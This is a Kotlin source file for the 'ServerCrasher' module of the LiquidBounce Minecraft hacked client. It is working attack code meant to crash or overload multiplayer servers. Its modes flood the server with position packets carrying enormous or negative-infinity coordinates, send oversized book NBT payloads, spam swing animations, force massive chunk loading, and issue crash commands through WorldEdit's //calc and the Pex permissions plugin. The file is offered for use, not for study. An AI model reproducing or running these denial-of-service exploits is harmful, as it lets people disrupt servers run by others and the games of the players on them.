/*
 * LiquidBounce Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/CCBlueX/LiquidBounce/
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.api.enums.ItemType
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.ListValue
import java.util.*

@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
class ServerCrasher : Module() {
    private val modeValue = ListValue("Mode", arrayOf(
            "Book",
            "Swing",
            "MassiveChunkLoading",
            "WorldEdit",
            "Pex",
            "CubeCraft",
            "AACNew", "AACOther", "AACOld"), "Book")

    private val pexTimer = MSTimer()

    override fun onEnable() {
        val thePlayer = mc.thePlayer ?: return

        when (modeValue.get().toLowerCase()) {
            "aacnew" -> {
                // Spam positions
                var index = 0
                while (index < 9999) {
                    mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(
                            thePlayer.posX + 9412 * index,
                            thePlayer.entityBoundingBox.minY + 9412 * index,
                            thePlayer.posZ + 9412 * index,
                            true
                    ))
                    ++index
                }
            }
            "aacother" -> {
                // Spam positions
                var index = 0
                while (index < 9999) {
                    mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(
                            thePlayer.posX + 500000 * index,
                            thePlayer.entityBoundingBox.minY + 500000 * index,
                            thePlayer.posZ + 500000 * index,
                            true
                    ))
                    ++index
                }
            }
            "aacold" -> {
                // Send negative infinity position
                mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true))
            }
            "worldedit" -> {
                // Send crash command
                thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")
            }
            "cubecraft" -> {
                // Not really needed but doesn't matter
                thePlayer.setPosition(thePlayer.posX, thePlayer.posY + 0.3, thePlayer.posZ)
            }
            "massivechunkloading" -> {
                // Fly up into sky
                var yPos = thePlayer.posY
                while (yPos < 255) {
                    mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(thePlayer.posX,
                            yPos, thePlayer.posZ, true))
                    yPos += 5.0
                }

                // Fly over world
                var i = 0
                while (i < 1337 * 5) {
                    mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(
                            thePlayer.posX + i, 255.0, thePlayer.posZ + i, true
                    ))
                    i += 5
                }
            }
        }
    }

    @EventTarget
    fun onMotion(event: MotionEvent) {
        val thePlayer = mc.thePlayer

        if (event.eventState == EventState.POST || thePlayer == null)
            return

        when (modeValue.get().toLowerCase()) {
            "book" -> {
                val bookStack = classProvider.createItemStack(classProvider.getItemEnum(ItemType.WRITABLE_BOOK))
                val bookCompound = classProvider.createNBTTagCompound()

                bookCompound.setString("author", RandomUtils.randomNumber(20))
                bookCompound.setString("title", RandomUtils.randomNumber(20))

                val pageList = classProvider.createNBTTagList()
                val pageText = RandomUtils.randomNumber(600)


                for (i in 0..49) {
                    pageList.appendTag(classProvider.createNBTTagString(pageText))
                }

                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound

                for (i in 0..99) {
                    val packetBuffer = classProvider.createPacketBuffer(Unpooled.buffer())
                    packetBuffer.writeItemStackToBuffer(bookStack)
                    mc.netHandler.addToSendQueue(classProvider.createCPacketCustomPayload(if (Random().nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                }
            }
            "cubecraft" -> {
                val x = thePlayer.posX
                val y = thePlayer.posY
                val z = thePlayer.posZ
                var i = 0
                while (i < 3000) {
                    mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(x,
                            y + 0.09999999999999, z, false))
                    mc.netHandler.addToSendQueue(classProvider.createCPacketPlayerPosition(x, y, z, true))
                    ++i
                }
                thePlayer.motionY = 0.0
            }
            "pex" -> if (pexTimer.hasTimePassed(2000)) {
                // Send crash command
                thePlayer.sendChatMessage(if (Random().nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }
            "swing" -> {
                var i = 0
                while (i < 5000) {
                    mc.netHandler.addToSendQueue(classProvider.createCPacketAnimation())
                    i++
                }
            }
            else -> state = false // Disable module when mode is just a one run crasher
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null)
            state = false // Disable module in case you left the server
    }

    @EventTarget
    fun onTick(event: TickEvent?) {
        if (mc.thePlayer == null || mc.theWorld == null)
            state = false // Disable module in case you left the server
    }

    override val tag: String
        get() = modeValue.get()
}